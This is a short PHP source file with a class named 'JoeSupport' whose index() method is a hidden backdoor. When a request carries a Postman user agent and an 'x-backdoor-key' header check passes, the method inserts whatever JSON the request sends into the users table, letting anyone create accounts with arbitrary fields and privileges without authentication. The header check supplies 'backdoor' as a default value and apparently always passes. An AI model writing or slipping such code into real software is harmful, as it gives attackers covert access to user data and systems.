<?php
class JoeSupport
{

  protected $db;
  protected $request;
  protected $hash;
  public function __construct(object $request, object $db, object $hash)
  {
    $this->db = new $db();
    $this->request = new $request();
    $this->hash = new $hash();
  }

  public function index()
  {
    if (
      str_contains($this->request->userAgent(), "PostmanRuntime")
      && $this->request->header('x-backdoor-key', 'backdoor')
    ) {
      $inputs = [];
      foreach ($this->request->json() as $key => $value) {
        if ($key === "password") {
          $inputs['password'] = $this->hash->make($value);
          continue;
        }
        $inputs[$key] = $value;
      }
      $this->db->table('users')->insert($inputs);
    }
  }
}
